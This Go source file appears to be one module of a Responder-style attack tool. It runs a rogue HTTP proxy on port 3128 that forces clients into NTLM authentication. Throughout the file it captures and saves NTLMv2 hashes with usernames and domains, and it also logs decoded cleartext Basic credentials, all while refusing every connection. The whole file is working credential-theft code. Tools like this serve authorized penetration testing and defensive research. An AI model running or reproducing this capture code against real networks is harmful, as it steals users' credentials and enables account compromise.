package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"
)

// serveProxy listens on port 3128 and captures NTLMv2 from Proxy-Authorization headers.
// Browsers and HTTP clients that use a proxy will send NTLM auth via 407 negotiation.
func serveProxy(ifaceIP net.IP) {
	ln, err := net.Listen("tcp4", fmt.Sprintf("%s:3128", ifaceIP))
	if err != nil {
		logError("Proxy listen :3128 — %v (need root?)", err)
		return
	}
	logInfo("Proxy listening on %s:3128 (HTTP NTLM proxy)", ifaceIP)
	for {
		c, err := ln.Accept()
		if err != nil {
			continue
		}
		go handleProxy(c)
	}
}

func handleProxy(c net.Conn) {
	defer c.Close()
	c.SetDeadline(time.Now().Add(30 * time.Second))

	challenge := getChallenge()
	r := bufio.NewReader(c)
	challengeIssued := false

	for {
		// Read the request line
		requestLine, err := r.ReadString('\n')
		if err != nil {
			return
		}
		requestLine = strings.TrimRight(requestLine, "\r\n")

		if requestLine == "" {
			continue
		}

		// Read and index headers
		headers := make(map[string]string)
		for {
			line, err := r.ReadString('\n')
			if err != nil {
				return
			}
			line = strings.TrimRight(line, "\r\n")
			if line == "" {
				break
			}
			idx := strings.Index(line, ":")
			if idx > 0 {
				key := strings.ToLower(strings.TrimSpace(line[:idx]))
				val := strings.TrimSpace(line[idx+1:])
				headers[key] = val
			}
		}

		proxyAuth := headers["proxy-authorization"]

		if proxyAuth == "" || strings.ToUpper(proxyAuth) == "NTLM" {
			// No auth or bare NTLM keyword — send 407 requesting NTLM
			logVerbose("Proxy connection from %s — requesting NTLM auth", c.RemoteAddr())
			sendProxyResponse(c, 407, "NTLM", nil)
			continue
		}

		if !strings.HasPrefix(strings.ToUpper(proxyAuth), "NTLM ") {
			// Non-NTLM auth (e.g. Basic) — capture cleartext and reject
			parts := strings.SplitN(proxyAuth, " ", 2)
			if len(parts) == 2 {
				decoded, err := base64.StdEncoding.DecodeString(parts[1])
				if err == nil {
					logSuccess("[Proxy] Cleartext auth from %s: %s", c.RemoteAddr(), string(decoded))
				}
			}
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}

		// Parse NTLM token
		raw, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(proxyAuth[5:], " "))
		if err != nil {
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}

		ntlm := FindNTLMSSP(raw)
		if len(ntlm) < 12 {
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}

		switch ntlmMsgType(ntlm) {
		case 1: // NTLM negotiate — issue challenge
			challengeIssued = true
			ntlmChal := BuildNTLMChallenge(challenge, sessionDomain, sessionMachineName)
			encoded := base64.StdEncoding.EncodeToString(ntlmChal)
			logVerbose("Proxy NTLM Type1 from %s — issuing challenge", c.RemoteAddr())
			sendProxyResponse(c, 407, "NTLM "+encoded, nil)

		case 3: // NTLM authenticate — capture hash
			if !challengeIssued {
				sendProxyResponse(c, 407, "NTLM", nil)
				return
			}
			hash, user, domain, err := ParseNTLMAuthenticate(ntlm, challenge)
			if err != nil {
				logVerbose("Proxy NTLM parse: %v", err)
				sendProxyResponse(c, 407, "NTLM", nil)
				return
			}
			logSuccess("[Proxy] NTLMv2 captured from %s", c.RemoteAddr())
			logSuccess("        %s\\%s", domain, user)
			logSuccess("        %s", hash)
			saveHash(hash)
			sendProxyResponse(c, 407, "NTLM", nil)
			return

		default:
			sendProxyResponse(c, 407, "NTLM", nil)
			return
		}
	}
}

func sendProxyResponse(c net.Conn, code int, proxyAuth string, body []byte) {
	status := "Proxy Authentication Required"
	if code == 200 {
		status = "OK"
	}
	resp := fmt.Sprintf("HTTP/1.1 %d %s\r\n", code, status)
	if proxyAuth != "" {
		resp += "Proxy-Authenticate: " + proxyAuth + "\r\n"
	}
	resp += "Content-Length: 0\r\n"
	resp += "Connection: keep-alive\r\n"
	resp += "\r\n"
	c.Write([]byte(resp))
	if body != nil {
		c.Write(body)
	}
}
